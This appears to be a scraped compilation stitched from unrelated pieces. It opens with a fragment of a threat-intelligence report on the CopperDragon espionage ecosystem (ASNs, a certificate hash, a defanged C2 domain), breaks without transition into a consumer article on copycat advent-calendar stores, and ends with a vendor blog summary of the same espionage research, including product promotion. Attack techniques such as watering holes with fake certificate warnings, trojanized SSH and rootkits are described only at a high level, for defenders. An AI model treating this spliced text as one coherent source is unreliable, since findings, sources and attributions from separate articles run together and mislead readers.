AS-VULTR, US (AS20473)

KAOPU-HK Kaopu Cloud HK Limited, HK (AS138915)

LATITUDE-SH (AS396356)

XNNET, US (AS6134)

CDNEXT, GB (AS212238)

ONEPROVIDER-AS BrainStorm Network, Inc, CA (AS136258)

In contrast, infrastructure linked to CopperDNS, which functions as a DNS tunneling C2 channel, consisted primarily of Windows-based hosts. These systems were consistently hosted within AS20473, AS-VULTR, exposed high-numbered ports (most commonly 6532), and reused a distinctive TLS certificate (SHA-256: ee4a8b81fe3864582efc27a77f806990e2602dcc36447ddda4b3a230a473d575) across multiple nodes.

Subject: CN=8.8.8.8 Issuer: CN=8.8.8.8 Serial Number: 0x20a61422b0352cfc9ef688dc800bcdf810f1fe7d Not Before: 2025-07-16T03:10:29 Not After: 2026-07-16T03:10:29 Fingerprint SHA-1: de32c58a8087cc4f24b9eb65c8ff4516f0f65f13

An additional pattern we observed across both infrastructures is geographic alignment with target regions. Most IP addresses were located in Latin America, often within the same country as the victim organization. This proximity likely helps the malicious traffic blend in with legitimate network activity and reduces the chances of detection.

DarkWire Attribution

We did not identify direct code similarities in DarkWire cluster with other tools in the CopperDragon toolset aside from general design patterns. However, we found an infrastructure link to a previous report on FamousSparrow activity. The domain amelicen[.]com was reported as a SparrowDoor C2 server, and our telemetry showed that the same domain was also part of the CopperDNS infrastructure.

We also observed VirusTotal submitters uploading files related to both SparrowDoor and DarkWire around the same time, suggesting that these tools may have been used in the same attack. In a recent report, ESET also observed that SparrowDoor was replaced on compromised hosts by CopperDoor (AKA SparroWocky), further strengthening the connection we identified.

Summary

CopperDragon is an entity we track as a possible digital quartermaster supporting several China-nexus threat actors that use the cross-platform Sparrow framework.

We identified at least three activity clusters, each using its own main backdoor and targeting different regions and organizations:

SilentDelivery – Uses the newly discovered SquadC along with a variant of SparrowDoor in watering-hole attacks across Europe and Asia.

OceanGate – Operates primarily in Asia, uses a variant of SparrowDoor and SparrowShell, and shows possible links to Melofee.

DarkWire – Targets telecommunications operators and government organizations in Latin America and uses the new CopperDoor and CopperDNS backdoors.

These findings provide a foundation for understanding CopperDragon’s potential users and more precise tracking of activity previously grouped under the FamousSparrow umbrella. In the highly interconnected China-nexus threat ecosystem, shared malware and infrastructure can blur the boundaries between operators and campaigns. However, the use of the same backdoor or C2 infrastructure does not necessarily mean that two intrusions were conducted by the same actor.

In this article

Store-added reviews and countdowns that keep resetting make products look popular and deals urgent

Missing contact details can make it harder to resolve a problem with an order

AI-generated images and unverified brand partnerships promote products with no licensing information

Learn how to check an online seller before you buy

Advent calendar buying guides are already appearing across the holiday shopping coverage this year. Social media can also put unfamiliar sellers directly in shoppers’ feeds. We found several stores using the same website template, product images with an AI-generated content watermark, and a TikTok account using one store’s branding to link straight to its product page.

We examined stores selling a Legend of Zelda music calendar, a Michael Jackson music calendar, a Lord of the Rings figure calendar, and Harry Potter character plant pots. Other stores, including one selling a Metallica calendar, use the same layout, low-stock warning, and recycled marketing lines. We found no licensing information on the stores, which is reason enough to avoid them.

Fake reviews and countdowns create a false sense of demand

Each store sells a single product. Its page surrounds polished product images with urgency cues: a sale that ends today, a low-stock warning, a five-minute cart reservation timer, a count of orders placed in the last day, and star ratings with thousands of reviews. Testimonials appear underneath, with “verified buyer” badges and timestamps such as “three hours ago.”

None of it is connected to anything. The ratings, review counts, and testimonials are entered into the site theme manually, rather than generated by a review system. The timestamps don’t change, and countdowns reset and run again—on some stores, every day.

Checkout runs through Shopify. That doesn’t establish whether orders will arrive or match their descriptions, and our investigation found no evidence that these pages were designed to steal card details. The risks we can support are misleading sales claims and the possibility of paying for something that never arrives or is very different from what was advertised. Several stores also offer optional checkout add-ons, including shipping protection, a queue-skip fee, and a mystery gift. On one store, these add-ons total nearly $35.

The Zelda calendar’s description contradicts itself

The clearest finding needs no technical analysis. The listing says each of the 25 discs holds a small chip storing your track data, and that the included player reads it and plays music through a built-in speaker with no app, no subscription and no Wi-Fi. Elsewhere on the same page it says the discs work with Spotify, Apple Music and YouTube, and that you can re-link any disc to a new song using a chip-writing app on your phone.

These claims cannot all be true. A device without a network connection can’t stream music from those services. And the instructions for linking discs to new songs suggest that each chip stores a link to a track, rather than the track itself. That’s how the legitimate version of this product works, according to our research: the chip holds a link, and a phone plays the music. Someone appears to have copied that mechanism and bolted a fictional standalone speaker onto it.

The bundle pricing also doesn’t add up. Two bundles claim savings of $15 and $33, but the prices shown below them work out to about $19 and $43 in savings.

The stores are copies of one another

Despite their different names, the stores we examined are nearly identical. They use the same commercial theme version and share an internal fingerprint indicating that their theme files are copies of one another. They also block right-clicking and access to developer tools.

The most direct link was left behind by accident, in that one store’s theme is still named after the file it was exported from, and that filename includes the web address of another store in the group. Other pages contain leftover text from a previous shop, including a warranty promising to replace costumes that don’t inflate properly and a scrolling banner with the unedited placeholder “use code X for X percent off.”

The stores’ files are timestamped from mid-July to the second week of September, with the newest store only days old when we examined it. Most merchant accounts are registered in Romania, while prices are shown in dollars. None of the calendar stores we examined listed a business address or phone number.

The pattern runs well past unlicensed character merchandise. We found advent calendars for fishing lures, squishy toys, charm bracelets, and wearable jumpers, with the same countdowns, stock warnings, and paid add-ons. Most appear to sell real, inexpensive goods at a steep markup. Their add-on prices differ, so we can’t conclude that the same person runs all of them. The evidence points to a shared sales playbook, not necessarily a shared owner.

What the evidence shows, and what it doesn’t

Product images from two of the calendar stores triggered a provenance checker for a watermark, indicating they were produced with OpenAI tools. The filenames agree: across three stores every product image follows the same automated naming pattern, and one store’s entire photography set is timestamped to a single afternoon.

A TikTok account uses one store’s name and branding and links directly to its product page. Several videos claim the store is collaborating with Walmart. They show retail scenes, including an oversized character figure outside a store and pallets of branded boxes. We found no evidence of such a partnership. The videos also depict scenes that don’t appear to be real. Combined with the shared website template and the filename linking two stores, this suggests that one operator or a closely connected group may be involved. It doesn’t establish who is behind the stores.

How to spot a questionable store before you pay

In our survey earlier this year, 22% of respondents said they had been “misled by AI-generated photos or product reviews.”Here are some checks that can help you spot warning signs.

Be wary of endless urgency. If a sale keeps “ending today” or low-stock warnings never change, don’t treat them as proof of a genuine deal.

Check that the product could exist. Search the product type and read how the real version works. If the listing claims something the technology can’t do, stop there.

Don’t arrive through a link. These stores sell largely through social video. Search the brand name separately and look for history, press, or customers outside its own website.

Treat partnership claims as claims. A video saying a brand is stocked by a retailer isn’t evidence that it is. Partnerships are announced by the retailer too, not only by the seller.

Look for a real business. A postal address, company registration and working phone number are easy for a legitimate seller to provide and were absent from these.

Reverse-image search the photos. Generated images usually have no history anywhere else online. A complete absence of results is itself informative.

Read the small print against itself. If a calendar’s warranty talks about inflatable costumes, the page wasn’t written for the product you’re buying.

Check the spelling, including on the box. We found a misspelled artist name in a product title, a mangled savings line, and a calendar with the word spelled “calindar” on the packaging artwork itself. A real manufacturer proofreads its own box.

Pay with a method that offers buyer protection. A credit card or payment service with buyer protection gives you a route to a refund. Bank transfers can be harder to reverse.

Tools that help

Malwarebytes Browser Guard blocks scam sites, which can help when a link appears in your feed before you’ve had a chance to look up the seller.

Malwarebytes Scam Guard lets you check a suspicious link, message, or screenshot when something feels off but you can’t say why.

If a purchase leads to follow-up texts or calls about delivery fees, customs charges, or a refund, Malwarebytes Scam Number Check can tell you whether the number has been reported. A follow-up message can turn a bad purchase into something worse.

Something feel off? Check it before you click.

Title: CopperDragon: Uncovering a Global China-Nexus Cyber Espionage Framework
Context: In addition to identifying malware and post-exploitation activity on endpoints, its browser security capabilities help protect users against web-based threats, malicious sites...
Full Text:
A year-long Check Point Research investigation has connected three China-nexus cyber-espionage clusters targeting government, telecommunications and critical infrastructure organizations across Europe, Asia and Latin America. While parts of this activity have previously been reported separately, the wider investigation reveals new insights and connections through shared malware and infrastructure, pointing to a broader ecosystem linked to an entity Check Point Research tracks as “CopperDragon”.

CopperDragon may operate as a digital quartermaster, developing or supplying malware and infrastructure to multiple sophisticated China-nexus threat actors. By examining the connections between these campaigns, Check Point Research provides a broader view of an espionage ecosystem spanning Windows and Linux environments, multiple regions and some of the world’s most strategically important sectors.

Figure 1 – Geographic distribution of Sparrow framework victims.

Key Findings

Check Point Research connected three operational clusters across Latin America, Asia and Europe, targeting government, telecom, military, research and critical infrastructure organizations.

CopperDragon may act as a digital quartermaster, supplying malware and infrastructure to multiple China-nexus threat actors using the Sparrow framework.

Activity was observed across 21 countries, with the research expanding known victimology and uncovering previously undocumented activity in Asia, including significant focus on India.

Researchers uncovered previously undocumented Windows and Linux malware, including SquadC, AnnobinDoor and SparrowShell, alongside new details about the Sparrow framework.

Attackers used different entry methods, from compromised internet-facing servers to selective watering-hole attacks involving fake browser certificate warnings.

What Is CopperDragon?

CopperDragon is the name Check Point Research uses to track the entity behind the Sparrow malware framework, which may serve as a developer and supplier supporting multiple China-nexus threat actors. The research suggests that malware and infrastructure associated with CopperDragon are being used across operations conducted by different China-nexus groups, rather than representing the activity of a single threat actor.

The picture began with FamousSparrow, previously linked to Salt Typhoon, a threat actor first identified in 2021 and associated with the SparrowDoor backdoor. In subsequent years, related malware and infrastructure appeared in activity associated with other China-nexus actors, including Earth Estries, TropicTrooper and UAT-9244. By examining these connections, Check Point Research identified signs of a common malware ecosystem that could be supporting multiple operators.

This distinction also matters for attribution. The presence of the same malware or command-and-control infrastructure across two intrusions does not necessarily mean they were conducted by the same threat actor. CopperDragon may instead represent a common supplier, helping explain why related tools and infrastructure appear across otherwise distinct espionage campaigns.

What Did Check Point Research Discover About CopperDragon?

The investigation connects activity that had previously been associated with separate campaigns and threat actors, providing a broader picture of how the Sparrow malware ecosystem is being used around the world. Check Point Research divided this activity into three operational clusters, SilentDelivery, OceanGate and DarkWire, based on differences in targeting, geography, malware and attack techniques.

The research also expands the known scope of the activity. Check Point Research identified a broader range of affected countries and sectors, uncovered previously undocumented activity in Asia with a particular focus on India, and discovered previously undocumented malware for both Windows and Linux. New findings include SquadC, AnnobinDoor and SparrowShell, alongside additional details about Sparrow’s passive backdoor and kernel-level capabilities.

Together, these findings support a broader view of CopperDragon as a possible digital quartermaster providing malware or infrastructure that different China-nexus operators can incorporate into their own campaigns. This provides another way to understand activity that could otherwise appear unrelated when examined as individual attacks.

Where Is CopperDragon Targeting Organizations?

Check Point Research observed CopperDragon-linked activity across 21 countries in Latin America, Europe and Asia, targeting telecommunications providers, government organizations, military entities, research institutions and critical infrastructure. The investigation separated the activity into three clusters based on their geography, tools and attack methods.

SilentDelivery focuses primarily on Europe and Asia and uses highly selective watering-hole attacks, including in Germany, France and Czech Republic. Attackers compromise legitimate websites associated with sectors such as government, shipping, IT and research, then selectively present visitors with fraudulent Chrome certificate warnings. Victims who follow the instructions can be tricked into downloading a supposed certificate repair utility that instead installs the SquadC backdoor or, in some cases, a variant of SparrowDoor.

Figure 2 – SilentDelivery infection chain.

OceanGate operates primarily in Asia and includes previously undocumented activity with a particular focus on India. In observed intrusions, attackers compromised internet-facing Linux systems and deployed custom backdoors before harvesting credentials and moving into Windows environments. The campaign provides additional insight into an area that has received comparatively limited attention: how Sparrow-related actors operate across Linux and Windows systems within the same intrusion.

Figure 3 – OceanGate cluster: Linux attack chain diagram.

DarkWire has been concentrated primarily in Latin America, although more recent intrusions indicate activity beyond the region. It targets telecommunications providers and government organizations using newly identified malware including CopperDoor and CopperDNS, together with tools designed for credential harvesting, internal reconnaissance and network movement.

Figure 4 – DarkWire toolset.

Why Are Government and Telecommunications Organizations Being Targeted?

Government and telecommunications organizations can provide significant intelligence value to espionage operations. A compromise of a government network can expose sensitive information, credentials and communications, while sustained access can create opportunities for continued intelligence collection.

Telecommunications providers are uniquely valuable targets for cyber espionage. Compromise one, and attackers can see far beyond the provider itself. Depending on which systems they reach, they can collect call detail records (CDRs) that reveal who talks to whom, when, and for how long. They can track subscriber locations and read SMS messages. In some environments, access may extend to lawful intercept systems, exposing which people government and law-enforcement agencies are monitoring.

This makes the concentration of DarkWire activity in Latin America particularly significant. The targeting takes place against a backdrop of growing strategic and economic competition involving China, the United States and countries across the region. While the technical evidence does not establish geopolitical motivation for individual attacks, the intelligence value of telecommunications and government infrastructure makes these sectors important targets for sophisticated espionage operations.

How Does CopperDragon Compromise Organizations?

The three clusters show that CopperDragon-linked actors use multiple routes into targeted organizations rather than relying on one attack method. Their techniques range from the exploitation of vulnerable public-facing infrastructure to compromised websites and selective social engineering.

SilentDelivery provides one of the clearest examples. Attackers compromise legitimate websites and inject heavily obfuscated JavaScript that communicates with attacker-controlled infrastructure. Selected visitors can then be presented with a fake Chrome certificate error instructing them to install a certificate fix. The download instead delivers SquadC or, in some cases, SparrowDoor, allowing attackers to establish an initial foothold.

OceanGate demonstrates a different approach. Attackers initially exploit vulnerable internet-facing Linux systems and deploy custom malware including AnnobinDoor and SparrowShell. Trojanized SSH components can then capture credentials during administrative activity, allowing the attackers to move between Linux hosts and eventually into Windows environments.

Once inside Windows networks, the actors use additional tools for reconnaissance, credential theft and continued access. These include CopperLogger for capturing keystrokes and clipboard activity, CopperLsa for stealing authentication data and CopperList for collecting system and file information.

The research also identified techniques intended to make persistent access more difficult to detect. SparrowShell can integrate with a modified Reptile rootkit that hides processes, files and network activity on Linux, while some SparrowDoor variants use WinDivert to intercept network traffic. This allows malicious communications to blend with traffic associated with legitimate services and illustrates why visibility across endpoint, server and network activity is important when defending against advanced espionage operations.

Figure 5 – A fake Chrome certificate error page with an added “Install certificate” button.

Figure 6 – A newer version of Chrome’s certificate error appearing in different languages.

How Can Organizations Defend Against CopperDragon and Sparrow Malware?

The diversity of the CopperDragon campaigns shows why organizations need protection across networks, endpoints, email and internet-facing infrastructure. The observed attacks can begin with exploitation of an exposed server, a compromised website or spear phishing, and then progress through credential theft and lateral movement across both Linux and Windows environments.

Organizations should prioritize several defensive measures:

Secure internet-facing infrastructure: Maintain an accurate inventory of exposed systems, rapidly patch known vulnerabilities and monitor internet-facing servers for unusual processes, authentication activity and connections.

Protect users from malicious downloads,phishing and compromised websites: Security controls should inspect links, websites, files and downloads, particularly unexpected utilities such as certificate fixes or software updates delivered through a website.

Detect credential theft and endpoint activity: Monitor for malicious DLL loading, credential dumping, keylogging, persistence mechanisms and suspicious use of otherwise legitimate administrative tools.

Limit and monitor lateral movement: RDP, SMB and SSH activity should be restricted to systems and accounts that require them, with abnormal administrative access investigated promptly.

Inspect network and DNS communications: Monitoring DNS, command-and-control traffic and unusual outbound connections can help expose backdoors, tunneling and other communications designed to blend into legitimate traffic.

For Check Point customers, Check Point Exposure Management can help organizations identify and prioritize weaknesses across their attack surface, particularly exposed and vulnerable assets that could provide an initial entry point. This is especially relevant to the CopperDragon campaigns, where exploitation of internet-facing infrastructure was one of the initial access methods observed by Check Point Research. It also finds lookalike domains, malicious phishing websites, and brand impersonations across apps, social media, and other channels, so security teams can take them down before attackers use them to reach employees or customers.

Check Point’s Workspace Security platform provides endpoint protection and behavioral detection that can help identify malware and post-exploitation activity such as those seen across the CopperDragon campaigns. In addition to identifying malware and post-exploitation activity on endpoints, its browser security capabilities help protect users against web-based threats, malicious sites and downloads, particularly relevant to the watering-hole attacks observed in SilentDelivery. Check Point Browser Security is positioned by Check Point as part of its Workspace Security and Endpoint Security offering. Check Point Email and Collaboration provides another layer of protection against phishing and malicious content used to establish initial access.

At the network layer, Check Point Network Security provides protections that can help detect and block malicious activity associated with these attack chains. Capabilities including Intrusion Prevention, Anti-Bot, Antivirus, Threat Emulation and DNS security provide coverage across exploitation attempts, malicious files and command-and-control communications.

The CopperDragon investigation highlights the importance of looking beyond an individual malware sample or threat-actor name. By identifying the shared framework and infrastructure behind seemingly separate operations, defenders can better understand how tools are moving through the wider China-nexus threat ecosystem and identify connections between attacks that might otherwise appear unrelated.
